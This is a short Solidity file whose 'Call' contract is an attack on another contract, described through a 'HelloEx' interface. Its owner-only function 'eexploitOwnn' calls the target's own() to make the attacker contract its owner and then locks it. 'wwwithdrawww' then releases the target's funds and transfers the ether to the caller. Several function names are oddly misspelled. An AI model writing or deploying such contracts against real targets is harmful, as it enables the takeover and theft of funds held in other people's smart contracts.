1 pragma solidity ^0.4.24;
2 contract HelloEx{
3 
4 	function own(address owner) {}
5 
6 	function releaseFunds(uint amount) {}
7 
8 	function lock() {}
9 }
10 
11 contract Call{
12 
13 	address owner;
14 
15 	HelloEx contr;
16 
17 	constructor() public
18 	{
19 		owner = msg.sender;
20 	}
21 
22 	function setMyContractt(address addr) public
23 	{
24 		require(owner==msg.sender);
25 		contr = HelloEx(addr);
26 	}
27 
28 	function eexploitOwnn() payable public
29 	{
30 		require(owner==msg.sender);
31 		contr.own(address(this));
32 		contr.lock();
33 	}
34 
35 	function wwwithdrawww(uint amount) public
36 	{
37 		require(owner==msg.sender);
38 		contr.releaseFunds(amount);
39 		msg.sender.transfer(amount * (1 ether));
40 	}
41 
42 	function () payable public
43 	{}
44 }